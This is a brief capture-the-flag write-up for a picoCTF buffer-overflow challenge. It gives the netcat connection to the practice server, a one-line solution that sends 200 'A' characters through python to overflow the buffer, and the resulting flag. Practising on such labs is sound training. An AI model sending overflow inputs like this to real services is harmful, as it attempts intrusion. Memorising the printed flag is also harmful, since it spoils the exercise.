## Objetivo

Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c). Connect using: 

## Datos de Acceso al Nivel

`nc saturn.picoctf.net 54338`
## Solucion

```
└─$ nc saturn.picoctf.net 54338 <<< $(python3 -c "print('A'*200)") 
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}

```

## Notas Adicionales



## Referencias

